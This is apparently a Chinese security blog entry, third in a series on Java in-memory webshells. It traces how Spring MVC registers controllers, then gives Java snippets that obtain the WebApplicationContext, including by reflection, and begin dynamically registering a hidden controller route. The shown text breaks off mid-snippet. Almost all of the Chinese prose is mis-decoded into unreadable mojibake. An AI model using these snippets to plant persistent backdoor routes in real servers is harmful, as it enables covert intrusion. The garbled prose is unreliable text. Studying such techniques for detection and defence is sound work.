    <content type="html"><![CDATA[<h1 id="Java-å†…å­˜é©¬ç¬¬ä¸‰ç¯‡-Spring-å†…å­˜é©¬"><a href="#Java-å†…å­˜é©¬ç¬¬ä¸‰ç¯‡-Spring-å†…å­˜é©¬" class="headerlink" title="Java å†…å­˜é©¬ç¬¬ä¸‰ç¯‡ - Spring å†…å­˜é©¬"></a>Java å†…å­˜é©¬ç¬¬ä¸‰ç¯‡ - Spring å†…å­˜é©¬</h1><h1 id="ä¸‰ã€Spring-å†…å­˜é©¬"><a href="#ä¸‰ã€Spring-å†…å­˜é©¬" class="headerlink" title="ä¸‰ã€Spring å†…å­˜é©¬"></a>ä¸‰ã€Spring å†…å­˜é©¬</h1><h2 id="1ã€Controller-å†…å­˜é©¬"><a href="#1ã€Controller-å†…å­˜é©¬" class="headerlink" title="1ã€Controller å†…å­˜é©¬"></a>1ã€Controller å†…å­˜é©¬</h2><h3 id="ä¸€äº›åŸºç¡€çŸ¥è¯†ï¼š"><a href="#ä¸€äº›åŸºç¡€çŸ¥è¯†ï¼š" class="headerlink" title="ä¸€äº›åŸºç¡€çŸ¥è¯†ï¼š"></a>ä¸€äº›åŸºç¡€çŸ¥è¯†ï¼š</h3><h4 id="Bean"><a href="#Bean" class="headerlink" title="Bean"></a>Bean</h4><p><code>Bean</code> æ˜¯ Spring æ¡†æ¶çš„ä¸€ä¸ª<strong>æ ¸å¿ƒæ¦‚å¿µ</strong>ï¼Œå®ƒæ˜¯æ„æˆåº”ç”¨ç¨‹åºçš„ä¸»å¹²ï¼Œå¹¶ä¸”æ˜¯ç”± <code>Spring IoC</code> å®¹å™¨è´Ÿè´£å®ä¾‹åŒ–ã€é…ç½®ã€ç»„è£…å’Œç®¡ç†çš„å¯¹è±¡ã€‚</p><ul><li>bean æ˜¯å¯¹è±¡</li><li>bean è¢« IoC å®¹å™¨ç®¡ç†</li><li>Spring åº”ç”¨ä¸»è¦æ˜¯ç”±ä¸€ä¸ªä¸ªçš„ bean æ„æˆçš„</li></ul><h4 id="IOCå®¹å™¨"><a href="#IOCå®¹å™¨" class="headerlink" title="IOCå®¹å™¨"></a>IOCå®¹å™¨</h4><p>å¦‚æœä¸€ä¸ªç³»ç»Ÿæœ‰å¤§é‡çš„ç»„ä»¶ï¼ˆç±»ï¼‰ï¼Œå…¶ç”Ÿå‘½å‘¨æœŸå’Œç›¸äº’ä¹‹é—´çš„ä¾èµ–å…³ç³»å¦‚æœç”±ç»„ä»¶è‡ªèº«æ¥ç»´æŠ¤ï¼Œä¸ä½†å¤§å¤§å¢åŠ äº†ç³»ç»Ÿçš„å¤æ‚åº¦ï¼Œè€Œä¸”ä¼šå¯¼è‡´ç»„ä»¶ä¹‹é—´æä¸ºç´§å¯†çš„è€¦åˆï¼Œç»§è€Œç»™æµ‹è¯•å’Œç»´æŠ¤å¸¦æ¥äº†æå¤§çš„å›°éš¾ã€‚è§£å†³è¿™ä¸€é—®é¢˜çš„æ ¸å¿ƒæ–¹æ¡ˆå°±æ˜¯IoCï¼ˆåˆç§°ä¸ºä¾èµ–æ³¨å…¥ï¼‰ã€‚ç”±IoCè´Ÿè´£åˆ›å»ºç»„ä»¶ã€æ ¹æ®ä¾èµ–å…³ç³»ç»„è£…ç»„ä»¶ã€æŒ‰ä¾èµ–é¡ºåºæ­£ç¡®é”€æ¯ç»„ä»¶ã€‚</p><p>IOCå®¹å™¨é€šè¿‡è¯»å–é…ç½®å…ƒæ•°æ®æ¥è·å–å¯¹è±¡çš„å®ä¾‹åŒ–ã€é…ç½®å’Œç»„è£…çš„æè¿°ä¿¡æ¯ã€‚é…ç½®çš„é›¶å…ƒæ•°æ®å¯ä»¥ç”¨<code>xml</code>ã€<code>Javaæ³¨è§£</code>æˆ–<code>Javaä»£ç </code>æ¥è¡¨ç¤ºã€‚</p><h4 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h4><p>Spring æ¡†æ¶ä¸­ï¼Œ<code>BeanFactory</code> æ¥å£æ˜¯ <code>Spring</code> <strong>IoCå®¹å™¨</strong> çš„å®é™…ä»£è¡¨è€…</p><p>Springå®¹å™¨å°±æ˜¯ApplicationContextï¼Œå®ƒæ˜¯ä¸€ä¸ªæ¥å£ç»§æ‰¿äºBeanFactoryï¼Œæœ‰å¾ˆå¤šå®ç°ç±»ã€‚è·å¾—äº†ApplicationContextçš„å®ä¾‹ï¼Œå°±è·å¾—äº†IoCå®¹å™¨çš„å¼•ç”¨ã€‚æˆ‘ä»¬å¯ä»¥ä»ApplicationContextä¸­å¯ä»¥æ ¹æ®Beançš„IDè·å–Beanã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518532.png" alt="img"></p><p>å› æ­¤ï¼Œ<code>org.springframework.context.ApplicationContext</code>æ¥å£ä¹Ÿä»£è¡¨äº† <code>IoCå®¹å™¨</code> ï¼Œå®ƒè´Ÿè´£å®ä¾‹åŒ–ã€å®šä½ã€é…ç½®åº”ç”¨ç¨‹åºä¸­çš„å¯¹è±¡(<code>bean</code>)åŠå»ºç«‹è¿™äº›å¯¹è±¡é—´(<code>beans</code>)çš„ä¾èµ–ã€‚</p><h3 id="1-1-Controller-åˆ›å»º"><a href="#1-1-Controller-åˆ›å»º" class="headerlink" title="1.1 Controller åˆ›å»º"></a>1.1 Controller åˆ›å»º</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519388.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519690.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519797.png" alt="img"></p><p>SpringController.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.springmem.demos.web;<br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringController</span> &#123;<br><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello world&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518537.png" alt="img"></p><h3 id="1-2-Controller-æ³¨å†Œæµç¨‹"><a href="#1-2-Controller-æ³¨å†Œæµç¨‹" class="headerlink" title="1.2 Controller æ³¨å†Œæµç¨‹"></a>1.2 Controller æ³¨å†Œæµç¨‹</h3><p>ä¹‹å‰å­¦ä¹ çš„ servletã€filterã€listener ç­‰éƒ½æ˜¯é€šè¿‡è®¿é—®ç‰¹å®šè·¯ç”±æ¥è®¿é—®ä¸Šä¼ çš„å†…å­˜é©¬ï¼Œé‚£ä¹ˆåœ¨ Spring ä¸­ç›´è§‚ä½“ç°è·¯ç”±é€»è¾‘çš„å°±æ˜¯ Controllerã€‚</p><p><strong>æ ¸å¿ƒè¯·æ±‚é“¾è·¯:</strong></p><p>å½“è®¿é—® <code>http://127.0.0.1:8098/hello</code> æ—¶ï¼Œè¯·æ±‚ç»è¿‡ä»¥ä¸‹å…³é”®æ­¥éª¤ï¼š</p><ol><li>Servlet å®¹å™¨å±‚ï¼šè¯·æ±‚å…ˆç»è¿‡ Tomcat å†…ç½®å®¹å™¨çš„ Filter é“¾ï¼ˆå¦‚ <code>WsFilter</code>ã€<code>RequestContextFilter</code>ï¼‰</li><li>Spring MVC å…¥å£ï¼šè¿›å…¥ <code>DispatcherServlet</code>ï¼ˆSpring MVC æ ¸å¿ƒå‰ç«¯æ§åˆ¶å™¨ï¼‰</li><li>è¯·æ±‚åˆ†å‘ï¼š<code>DispatcherServlet.doDispatch()</code> æ–¹æ³•è´Ÿè´£è¯·æ±‚åˆ†å‘ï¼Œæ ¸å¿ƒé€»è¾‘æ˜¯ã€Œæ‰¾åˆ°åŒ¹é…çš„ Controller æ–¹æ³•ã€</li><li>Handler æ˜ å°„ï¼šé€šè¿‡ <code>getHandler()</code> æ–¹æ³•éå† <code>handlerMappings</code> åˆ—è¡¨ï¼Œæ‰¾åˆ°èƒ½å¤„ç† <code>/index</code> è·¯å¾„çš„æ˜ å°„å™¨</li><li>æ–¹æ³•æ‰§è¡Œï¼šè°ƒç”¨åŒ¹é…çš„ Controller æ–¹æ³•ï¼ˆ<code>MyController.index()</code>ï¼‰ï¼Œè¿”å›å“åº”ç»“æœ</li></ol><p>æ–­ç‚¹è°ƒè¯•ï¼Œåˆ†æ Controller çš„æ³¨å†Œæµç¨‹</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518563.png" alt="img"></p><p><code>doDispatch</code> å‡½æ•°é€šå¸¸å‡ºç°åœ¨åŸºäº Spring MVC æ¡†æ¶çš„ Java Web åº”ç”¨ç¨‹åºä¸­ï¼Œå®ƒæ˜¯ <code>DispatcherServlet</code> ç±»çš„ä¸€ä¸ªæ–¹æ³•ã€‚<code>DispatcherServlet</code> æ˜¯ Spring MVC ä¸­çš„æ ¸å¿ƒæ§åˆ¶å™¨ï¼ˆå‰ç«¯æ§åˆ¶å™¨ï¼‰ï¼Œè´Ÿè´£æ¥æ”¶æ‰€æœ‰çš„ HTTP è¯·æ±‚ï¼Œå¹¶æ ¹æ®è¯·æ±‚æ˜ å°„ï¼ˆé€šå¸¸æ˜¯é€šè¿‡æ³¨è§£æˆ– XML é…ç½®ï¼‰æ¥å†³å®šåº”è¯¥è°ƒç”¨å“ªä¸ªæ§åˆ¶å™¨ï¼ˆControllerï¼‰æ¥å¤„ç†è¿™ä¸ªè¯·æ±‚ã€‚<br>å…·ä½“æ¥è¯´ï¼Œ<code>doDispatch</code> æ–¹æ³•çš„ä¸»è¦èŒè´£åŒ…æ‹¬ï¼š</p><ol><li><strong>è§£æè¯·æ±‚</strong>ï¼šä»ä¼ å…¥çš„ HTTP è¯·æ±‚ä¸­æå–å¿…è¦çš„ä¿¡æ¯ï¼Œæ¯”å¦‚è¯·æ±‚è·¯å¾„ã€è¯·æ±‚æ–¹æ³•ç­‰ã€‚</li><li><strong>æŸ¥æ‰¾å¤„ç†å™¨</strong>ï¼šä½¿ç”¨å¤„ç†å™¨æ˜ å°„ï¼ˆHandlerMappingï¼‰æœºåˆ¶æ¥æ‰¾åˆ°èƒ½å¤Ÿå¤„ç†å½“å‰è¯·æ±‚çš„å¤„ç†å™¨å¯¹è±¡ï¼ˆå³ Controller ä¸­çš„æ–¹æ³•ï¼‰ã€‚è¿™ä¸€æ­¥éª¤æ¶‰åŠå°† URL è·¯å¾„ä¸å·²æ³¨å†Œçš„å¤„ç†å™¨è¿›è¡ŒåŒ¹é…ã€‚</li><li><strong>åˆ›å»ºå¤„ç†å™¨é€‚é…å™¨</strong>ï¼šä¸€æ—¦æ‰¾åˆ°äº†åˆé€‚çš„å¤„ç†å™¨ï¼Œå°±ä¼šé€šè¿‡å¤„ç†å™¨é€‚é…å™¨ï¼ˆHandlerAdapterï¼‰æ¥è°ƒç”¨è¯¥å¤„ç†å™¨ã€‚å¤„ç†å™¨é€‚é…å™¨è´Ÿè´£æ‰§è¡Œå…·ä½“çš„æ§åˆ¶é€»è¾‘ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ¨¡å‹è§†å›¾å¯¹è±¡ï¼ˆModelAndViewï¼‰ã€‚</li><li><strong>æ¸²æŸ“å“åº”</strong>ï¼šåŸºäºå¤„ç†å™¨è¿”å›çš„æ¨¡å‹è§†å›¾å¯¹è±¡ï¼Œé€‰æ‹©åˆé€‚çš„è§†å›¾è§£æå™¨ï¼ˆViewResolverï¼‰æ¥ç”Ÿæˆæœ€ç»ˆçš„å“åº”å†…å®¹ã€‚è¿™å¯èƒ½æ¶‰åŠåˆ°ä»æ•°æ®åº“è·å–æ•°æ®ã€è°ƒç”¨ä¸šåŠ¡é€»è¾‘æœåŠ¡ç­‰æ“ä½œã€‚</li><li><strong>å¤„ç†å¼‚å¸¸</strong>ï¼šå¦‚æœåœ¨ä¸Šè¿°è¿‡ç¨‹ä¸­å‘ç”Ÿä»»ä½•å¼‚å¸¸ï¼Œ<code>doDispatch</code> ä¹Ÿä¼šè´Ÿè´£æ•è·è¿™äº›å¼‚å¸¸å¹¶é€šè¿‡é€‚å½“çš„å¼‚å¸¸è§£æå™¨ï¼ˆExceptionResolverï¼‰æ¥å¤„ç†å®ƒä»¬ï¼Œç¡®ä¿åº”ç”¨ç¨‹åºèƒ½å¤Ÿä¼˜é›…åœ°åº”å¯¹é”™è¯¯æƒ…å†µå¹¶ç»™å®¢æˆ·ç«¯è¿”å›æœ‰æ„ä¹‰çš„ä¿¡æ¯ã€‚</li></ol><p>æ€»ä¹‹ï¼Œ<code>doDispatch</code> åœ¨ Spring MVC çš„å·¥ä½œæµç¨‹ä¸­æ‰®æ¼”äº†æå…¶é‡è¦çš„è§’è‰²ï¼Œå®ƒåè°ƒäº†ä»æ¥æ”¶åˆ°è¯·æ±‚åˆ°äº§ç”Ÿå“åº”çš„æ•´ä¸ªè¿‡ç¨‹ï¼Œæ˜¯å®ç°æ¾è€¦åˆä¸”å¯æ‰©å±•Webåº”ç”¨çš„å…³é”®éƒ¨åˆ†ä¹‹ä¸€ã€‚</p><p>æˆ‘ä»¬ä» doDispatch å¼€å§‹çœ‹</p><p>è®¿é—® &#x2F;hello è·¯ç”±æ—¶ï¼Œé¦–å…ˆè¦è¿›å…¥åˆ° getHandler()</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518762.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519846.png" alt="img"></p><p>getHandler() ä¸­æœ‰ä¸€ä¸ª HandlerMappingsï¼ŒHandlerMappings ä¸­å­˜åœ¨ 5 ä¸ªHandlerMapping ,</p><p>é€šè¿‡è¿™äº”ä¸ªæ¥ç¡®å®šå½“å‰è¯·æ±‚çš„å¤„ç†ç¨‹åº</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518317.png" alt="img"></p><p>&#x2F;&#x2F;Determine handler adapter for the current request.ç¡®å®šå½“å‰è¯·æ±‚çš„å¤„ç†ç¨‹åºé€‚é…å™¨ã€‚</p><p>HandlerAdapter ha &#x3D; getHandlerAdapter(mappedHandler.getHandler());</p><p>é€šè¿‡ <code>HandlerMapping</code> æ‰¾åˆ° <code>Handler</code>ï¼Œ<code>**getHandlerAdapter(mappedHandler.getHandler())**</code> <strong>ï¼šæ ¹æ®æ‰¾åˆ°çš„</strong><code>**Handler**</code><strong>çš„ç±»å‹ï¼Œæ‰¾åˆ°èƒ½å¤„ç†å®ƒçš„</strong> <code>**HandlerAdapter**</code><strong>ã€‚</strong></p><p>åœ¨è¿™ä¸€è¿‡ç¨‹ä¸­ï¼Œé€‰æ‹©äº†é€‚é…å™¨è¿›è¡Œå¤„ç†</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519676.png" alt="img"></p><p>ç»§ç»­å¾€ä¸‹ï¼Œè¿™ä¸€æ­¥æ—¶å®é™…å¤„ç† handler çš„</p><p>&#x2F;&#x2F;Actually invoke the handler.</p><p>mv &#x3D; ha.handle(processedRequest, response, mappedHandler.getHandler());</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519550.png" alt="img"></p><p><strong>ç°åœ¨éœ€è¦è¿”å›åˆ° mappedHandler &#x3D; getHandler(processedRequest);</strong><br>åœ¨è¿™ä¸€æ­¥ä¸­ï¼Œä¼šè¿›å…¥ getHandler() </p><p>â€‹</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518045.png" alt="img"></p><p>æœ€ç»ˆä¼šæ¥åˆ°ï¼š getHandlerInternal() æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518054.png" alt="img"></p><p>è€Œå…¶ä¸­çš„ mappingRegistry ä¸­å­˜æ”¾ç€æˆ‘ä»¬çš„è·¯ç”±ä¿¡æ¯</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519356.png" alt="img"></p><p>è¿™é‡Œé¦–å…ˆå¯¹<code>mappingRegistry</code>è¿›è¡Œä¸Šé”ï¼Œæœ€ååœ¨ finally å—ä¸­ï¼Œè¿›è¡Œè§£é”ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518642.png" alt="img"></p><p>åœ¨ lookupPath ä¸­è·å–äº†æˆ‘ä»¬è®¿é—®çš„è·¯ç”±</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518920.png" alt="img"></p><p><strong>æ¥ä¸‹æ¥åˆ†æä¸€ä¸‹å®ƒçš„æ³¨å†Œæµç¨‹ï¼š</strong></p><p>åœ¨ AbstractHandlerMethodMapping.initHandlerMethods å¤„ä¸‹æ–­ç‚¹è°ƒè¯•</p><p>initHandlerMethods æ–¹æ³•æ‰«æ ApplicationContext ä¸­çš„ beanï¼Œæ£€æµ‹å’Œæ³¨å†Œå¤„ç†ç¨‹åºæ–¹æ³•</p><p>ä½¿ç”¨<code>processCandidateBean</code>æ–¹æ³•ä¸­æ¥å¤„ç†bean</p><p>æ–­ç‚¹è¦è®©ä»–è¿è¡Œç›´åˆ°è·å¾—æˆ‘ä»¬éœ€è¦çš„ SpringController</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518356.png" alt="img"></p><p>è¿›å…¥ processCandidateBean æ–¹æ³•</p><p>é¦–å…ˆé€šè¿‡ getType() è·å–åˆ°äº† beanType</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081520106.png" alt="img"></p><p>åˆ¤æ–­è¯¥Beanæ˜¯å¦ä¸º<code>Handler</code>å¯¹è±¡ï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œå°±å°†å…¶ä¼ å…¥<code>detectHandlerMethods</code>æ–¹æ³•ä¸­</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518461.png" alt="img"></p><p>getUserClass  è·å–ç±»å</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081520959.png" alt="img"></p><p>è·å–æ–¹æ³•å</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081520985.png" alt="img"></p><p>registerHandlerMethod æ‰§è¡Œæ³¨å†Œæ“ä½œ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518416.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518826.png" alt="img"></p><h3 id="1-3-å†…å­˜é©¬ç¼–å†™"><a href="#1-3-å†…å­˜é©¬ç¼–å†™" class="headerlink" title="1.3 å†…å­˜é©¬ç¼–å†™"></a>1.3 å†…å­˜é©¬ç¼–å†™</h3><h4 id="1-3-1-è·å–ä¸Šä¸‹æ–‡"><a href="#1-3-1-è·å–ä¸Šä¸‹æ–‡" class="headerlink" title="1.3.1 è·å–ä¸Šä¸‹æ–‡"></a>1.3.1 è·å–ä¸Šä¸‹æ–‡</h4><p>å¯¹äºå†…å­˜é©¬çš„æ³¨å…¥ï¼Œæœ€é‡è¦çš„äº‹æƒ…å°±æ˜¯è·å–ä¸Šä¸‹æ–‡ï¼Œåœ¨Tomcatä¸­è·å–è¯´çš„ä¸Šä¸‹æ–‡ä¸º<code>StandardContext</code>ï¼Œå¯¹äºSpringè·å–çš„å°±æ˜¯<code>WebApplicationContext</code>ã€‚</p><p>äº”ç§æ–¹æ³•ï¼š</p><ol><li>ContextLoader</li><li>WebApplicationContextUtils</li><li>RequestContextUtils</li><li>getAttribute</li><li>åå°„è·å–</li></ol><h5 id="ContextLoader"><a href="#ContextLoader" class="headerlink" title="ContextLoader"></a><strong>ContextLoader</strong></h5><p><code>getCurrentWebApplicationContext</code> è·å¾—çš„æ˜¯ä¸€ä¸ª <code>XmlWebApplicationContext</code> å®ä¾‹ç±»å‹çš„ <code>Root WebApplicationContext</code>ã€‚  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> ContextLoader.getCurrentWebApplicationContext();<br></code></pre></td></tr></table></figure><h5 id="WebApplicationContextUtils"><a href="#WebApplicationContextUtils" class="headerlink" title="WebApplicationContextUtils"></a>WebApplicationContextUtils</h5><p>é€šè¿‡è¿™ç§æ–¹æ³•è·å¾—çš„ä¹Ÿæ˜¯ä¸€ä¸ª <code>Root WebApplicationContext</code>ã€‚å…¶ä¸­ <code>WebApplicationContextUtils.getWebApplicationContext</code> å‡½æ•°ä¹Ÿå¯ä»¥ç”¨ <code>WebApplicationContextUtils.getRequiredWebApplicationContext</code>æ¥æ›¿æ¢ã€‚  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());<br></code></pre></td></tr></table></figure><h5 id="RequestContextUtils"><a href="#RequestContextUtils" class="headerlink" title="RequestContextUtils"></a><strong>RequestContextUtils</strong></h5><p>é€šè¿‡ <code>ServletRequest</code> ç±»çš„å®ä¾‹æ¥è·å¾— <code>Child WebApplicationContext</code>ã€‚  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());<br></code></pre></td></tr></table></figure><h5 id="getAttribute"><a href="#getAttribute" class="headerlink" title="getAttribute"></a><strong>getAttribute</strong></h5><p> è¿™ç§æ–¹å¼ä¸å‰å‡ ç§çš„æ€è·¯å°±ä¸å¤ªä¸€æ ·äº†ï¼Œå› ä¸ºæ‰€æœ‰çš„Contextåœ¨åˆ›å»ºåï¼Œéƒ½ä¼šè¢«ä½œä¸ºä¸€ä¸ªå±æ€§æ·»åŠ åˆ°äº†ServletContextä¸­ã€‚æ‰€ä»¥é€šè¿‡ç›´æ¥è·å¾—ServletContexté€šè¿‡å±æ€§Contextæ‹¿åˆ° Child WebApplicationContext  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h5 id="åå°„è·å–"><a href="#åå°„è·å–" class="headerlink" title="åå°„è·å–"></a>åå°„è·å–</h5><p> è¿˜å¯ä»¥é€šè¿‡åå°„è·å–<code>LiveBeansView</code>ç±»çš„<code>applicationContexts</code> å±æ€§æ¥è·å–ä¸Šä¸‹æ–‡ã€‚  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 1. åå°„ org.springframework.context.support.LiveBeansView ç±» applicationContexts å±æ€§</span><br>java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">filed</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.context.support.LiveBeansView&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;applicationContexts&quot;</span>);<br><span class="hljs-comment">// 2. å±æ€§è¢« private ä¿®é¥°ï¼Œæ‰€ä»¥ setAccessible true</span><br>filed.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// 3. è·å–ä¸€ä¸ª ApplicationContext å®ä¾‹</span><br>org.springframework.web.context.<span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span>(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(<span class="hljs-literal">null</span>)).iterator().next();<br></code></pre></td></tr></table></figure><p><code>org.springframework.context.support.LiveBeansView</code> ç±»åœ¨ <code>spring-context</code> 3.2.x ç‰ˆæœ¬ï¼ˆç°åœ¨æœ€æ–°ç‰ˆæœ¬æ˜¯ 5.3.xï¼‰æ‰åŠ å…¥å…¶ä¸­ï¼Œæ‰€ä»¥æ¯”è¾ƒä½ç‰ˆæœ¬çš„ spring æ— æ³•é€šè¿‡æ­¤æ–¹æ³•è·å¾— <code>ApplicationContext</code> çš„å®ä¾‹ã€‚  </p><h4 id="1-3-2-æ³¨å†Œ-Controller"><a href="#1-3-2-æ³¨å†Œ-Controller" class="headerlink" title="1.3.2 æ³¨å†Œ Controller"></a>1.3.2 æ³¨å†Œ Controller</h4><p>Spring Controller çš„åŠ¨æ€æ³¨å†Œï¼Œå°±æ˜¯å¯¹ <code>RequestMappingHandlerMapping</code> æ³¨å…¥çš„è¿‡ç¨‹ã€‚</p><p>Spring 2.5 å¼€å§‹åˆ° Spring 3.1 ä¹‹å‰ä¸€èˆ¬ä½¿ç”¨<br><code>org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping</code><br>æ˜ å°„å™¨ ï¼›</p><p>Spring 3.1 å¼€å§‹åŠä»¥åä¸€èˆ¬å¼€å§‹ä½¿ç”¨æ–°çš„<br><code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</code>æ˜ å°„å™¨æ¥æ”¯æŒ@Contollerå’Œ@RequestMappingæ³¨è§£ã€‚</p><p>ä¸‰ç§æ–¹æ³•ï¼š</p><ol><li>registerMapping</li><li>registerHandler</li><li>detectHandlerMethods</li></ol><h5 id="registerMapping"><a href="#registerMapping" class="headerlink" title="registerMapping"></a>registerMapping</h5><p> åœ¨Spring 4.0åŠä»¥åï¼Œå¯ä»¥ä½¿ç”¨registerMappingç›´æ¥æ³¨å†ŒrequestMapping  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 1. ä»å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­è·å¾— RequestMappingHandlerMapping çš„å®ä¾‹ bean</span><br><span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br><span class="hljs-comment">// 2. é€šè¿‡åå°„è·å¾—è‡ªå®šä¹‰ controller ä¸­å”¯ä¸€çš„ Method å¯¹è±¡</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> (Class.forName(<span class="hljs-string">&quot;me.landgrey.SSOLogin&quot;</span>).getDeclaredMethods())[<span class="hljs-number">0</span>];<br><span class="hljs-comment">// 3. å®šä¹‰è®¿é—® controller çš„ URL åœ°å€</span><br><span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/hahaha&quot;</span>);<br><span class="hljs-comment">// 4. å®šä¹‰å…è®¸è®¿é—® controller çš„ HTTP æ–¹æ³•ï¼ˆGET/POSTï¼‰</span><br><span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">ms</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();<br><span class="hljs-comment">// 5. åœ¨å†…å­˜ä¸­åŠ¨æ€æ³¨å†Œ controller</span><br><span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, ms, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span 